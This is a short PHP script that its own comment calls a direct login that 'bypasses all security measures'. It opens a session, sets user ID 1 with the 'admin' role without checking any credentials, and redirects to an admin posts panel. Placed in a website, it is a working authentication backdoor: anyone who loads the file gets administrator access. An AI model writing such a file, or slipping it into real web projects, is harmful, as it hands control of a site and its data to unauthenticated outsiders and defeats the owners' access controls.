<?php
// This is a direct login script that bypasses all security measures
session_start();

// Set session variables directly
$_SESSION['user_id'] = 1;
$_SESSION['role'] = 'admin';
$_SESSION['last_activity'] = time();
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];

// Redirect to admin panel
header('Location: admin/posts.php');
exit();
?>